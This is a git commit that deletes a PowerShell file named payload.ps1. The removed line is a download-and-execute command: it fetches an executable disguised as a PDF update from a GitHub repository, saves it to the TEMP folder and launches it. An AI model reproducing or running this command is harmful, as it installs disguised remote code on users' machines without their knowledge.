0c87e5158daed56abbad26fd0025f1285b9878d7
adrian-cheese <meltedcrypto@gmail.com>
2025-05-01 05:28:56 +0200

    Delete payload.ps1

--- payload.ps1
+++
@@ -1,1 +0,0 @@
-Invoke-WebRequest -Uri https://github.com/adrian-cheese/PDF_Update_9_17_12/raw/refs/heads/main/PDF_Update_9_17_12.exe -OutFile "$env:TEMP\update.exe"; Start-Process "$env:TEMP\update.exe"
